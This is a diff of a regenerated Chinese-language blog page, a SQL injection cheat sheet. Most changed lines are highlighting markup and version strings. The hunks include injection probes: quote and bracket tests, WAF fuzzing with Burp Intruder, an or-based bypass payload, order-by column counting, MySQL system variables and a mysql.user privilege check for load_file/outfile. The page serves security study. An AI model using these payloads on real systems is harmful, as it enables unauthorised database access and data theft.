@@ -10,17 +10,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="思路0x01 参数包裹测试 1 &#39; &quot; ( &amp;#123;  0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id&#x3D;1$&#39;$  测试关键字waf，and，select等 id&#x3D;1$and$  依据有差别的注入点，测试替换 i">
+    <meta name="description" content="思路0x01 参数包裹测试 1 &#39; &quot; ( {  0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id&#x3D;1$&#39;$  测试关键字waf，and，select等 id&#x3D;1$and$  依据有差别的注入点，测试替换 id&#x3D;-1&#39; or &#39;&#39;&#x3D;&#39;$and$">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入总结">
 <meta property="og:url" content="https://0xr1ngs.github.io/2018/05/26/sql/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="思路0x01 参数包裹测试 1 &#39; &quot; ( &amp;#123;  0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id&#x3D;1$&#39;$  测试关键字waf，and，select等 id&#x3D;1$and$  依据有差别的注入点，测试替换 i">
+<meta property="og:description" content="思路0x01 参数包裹测试 1 &#39; &quot; ( {  0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id&#x3D;1$&#39;$  测试关键字waf，and，select等 id&#x3D;1$and$  依据有差别的注入点，测试替换 id&#x3D;-1&#39; or &#39;&#39;&#x3D;&#39;$and$">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://0xr1ngs.github.io/2018/05/26/sql/1.bmp">
 <meta property="og:image" content="https://0xr1ngs.github.io/2018/05/26/sql/1.png">
 <meta property="article:published_time" content="2018-05-26T09:18:33.000Z">
-<meta property="article:modified_time" content="2023-07-10T09:15:04.977Z">
+<meta property="article:modified_time" content="2023-07-10T10:26:21.341Z">
 <meta property="article:author" content="r1ngs">
 <meta property="article:tag" content="sqli">
 <meta name="twitter:card" content="summary">
@@ -30,13 +30,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688982682206">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688984800641">
     
-    <link rel="stylesheet" href="/css/style.css?v=1688982682206">
+    <link rel="stylesheet" href="/css/style.css?v=1688984800641">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1688982682206">
+            <link rel="stylesheet" href="/custom.css?v=1688984800641">
         
     
 
@@ -45,7 +45,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1688982682206"></script>
+    <script async src="/js/app.js?v=1688984800642"></script>
     
      
 
@@ -291,17 +291,17 @@
 </div>
 
     <h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="0x01-参数包裹"><a href="#0x01-参数包裹" class="headerlink" title="0x01 参数包裹"></a>0x01 参数包裹</h2><p>测试</p>
-<pre><code>1 &#39; &quot; ( &#123;
-</code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span> ' " <span class="token punctuation">(</span> {
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="0x02-测试WAF"><a href="#0x02-测试WAF" class="headerlink" title="0x02 测试WAF"></a>0x02 测试WAF</h2><p>测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空<br>用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等</p>
-<pre><code>id=1$&#39;$
-</code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>$'$
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>测试关键字waf，and，select等</p>
-<pre><code>id=1$and$
-</code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>$<span class="token operator">and</span>$
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>依据有差别的注入点，测试替换</p>
-<pre><code>id=-1&#39; or &#39;&#39;=&#39;$and$ /*测试有没有被替换为空等*/
-</code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' or '</span><span class="token string">'='</span>$<span class="token operator">and</span>$ <span class="token comment" spellcheck="true">/*测试有没有被替换为空等*/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="0x03-测试payload"><a href="#0x03-测试payload" class="headerlink" title="0x03 测试payload"></a>0x03 测试payload</h2><p>根据被waf的关键字和测试出的能被绕过的关键字去构造payload，确定注入的类型，再用脚本</p>
 <h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="0x01-联合查询（有数据回显的时候）"><a href="#0x01-联合查询（有数据回显的时候）" class="headerlink" title="0x01 联合查询（有数据回显的时候）"></a>0x01 联合查询（有数据回显的时候）</h2><p>获取字段数</p>
 <pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
@@ -539,10 +539,10 @@ Empty <span class="token keyword">set</span> <span class="token punctuation">(</
 <span class="token delimiter">?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/test404/p/7821884.html">sprintf格式化字符串带来的注入隐患</a></p>
-<h1 id="load-file和outfile"><a href="#load-file和outfile" class="headerlink" title="load_file和outfile"></a>load_file和outfile</h1><h2 id="mysql常见的系统函数和变量"><a href="#mysql常见的系统函数和变量" class="headerlink" title="mysql常见的系统函数和变量"></a>mysql常见的系统函数和变量</h2><pre><code>user() 用户名,current_user 当前用户名,session_user() 连接数据库的用户名
-@@hostname 主机名,@@port 数据库端口,version() mysql数据库版本
-@@version_compile_os 操作系统,@@datadir 数据库绝对路径,@@basedir mysql绝对路径
-</code></pre>
+<h1 id="load-file和outfile"><a href="#load-file和outfile" class="headerlink" title="load_file和outfile"></a>load_file和outfile</h1><h2 id="mysql常见的系统函数和变量"><a href="#mysql常见的系统函数和变量" class="headerlink" title="mysql常见的系统函数和变量"></a>mysql常见的系统函数和变量</h2><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 用户名<span class="token punctuation">,</span><span class="token keyword">current_user</span> 当前用户名<span class="token punctuation">,</span><span class="token keyword">session_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 连接数据库的用户名
+@<span class="token variable">@hostname</span> 主机名<span class="token punctuation">,</span>@<span class="token variable">@port</span> 数据库端口<span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span> mysql数据库版本
+@<span class="token variable">@version_compile_os</span> 操作系统<span class="token punctuation">,</span>@<span class="token variable">@datadir</span> 数据库绝对路径<span class="token punctuation">,</span>@<span class="token variable">@basedir</span> mysql绝对路径
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>测试读写权限</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">and</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -765,7 +765,7 @@ mysql<span class="token operator">></span> <span class="token keyword">SELECT</s
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1688982682122"></script>
+    <script async src="/js/copy-codeblock.js?v=1688984800557"></script>
   
 
   
